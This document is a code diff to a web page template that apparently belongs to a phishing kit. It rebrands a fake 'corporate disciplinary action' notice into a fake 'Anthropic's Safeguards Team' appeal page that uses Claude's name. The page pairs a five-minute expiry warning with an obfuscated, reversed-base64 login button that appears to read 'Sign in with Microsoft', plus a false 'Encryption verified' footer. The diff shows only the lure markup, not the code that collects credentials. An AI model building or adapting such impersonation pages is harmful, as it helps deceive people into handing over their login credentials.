@@ -584,7 +584,7 @@ const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/prima
 const primaryHTML = `
     <header>
         
-        <div id="logo">Ntiva Client Support</div>
+        <div id="logo">Claude Client Support</div>
         <nav>
             <a href="#">Home</a>
             <a href="#">Services</a>
@@ -596,14 +596,14 @@ const primaryHTML = `
 
     <main>
         <section id="hero">
-            <h1>Corporate Discliplinary Actions</h1>
+            <h1>Anthropic's Safeguards Team</h1>
             
-            <p>Confidential internal communication, Supporting records included.</p>
+            <p>Acceptable Usage Policy.</p>
         </section>
 
         <section id="registration-form-section">
             <section id="training-info">
-                <h2>Your Upcoming Corporate Disciplinary Action - Internal Review</h2>
+                <h2>Your Upcoming Appeal Progress with Anthropic's Safeguards Team</h2>
                 
                 <p>Records are preserved, documentation is reviewed, and an internal assessment is performed.</p>
                 
@@ -612,7 +612,7 @@ const primaryHTML = `
             <div id="primary-overlay-container">
                 <div id="paywall-modal">
                     <h3 id="lg-h">In five minutes, your review link will expire.</h3>
-                    <p id="lg-p">Review reference information associated with this case.</p>
+                    <p id="lg-p">Continue to appeal your case.</p>
                     
                     <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
                 </div>
@@ -625,10 +625,11 @@ const primaryHTML = `
     </main>
 
     <footer>
-        <p>&copy; Encryption verified by Ntiva — 2026 HITRUST certified</p>
+        <p>&copy; Encryption verified by Anthropic's — 2026</p>
         <nav>
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
         </nav>
     </footer>
+
 `
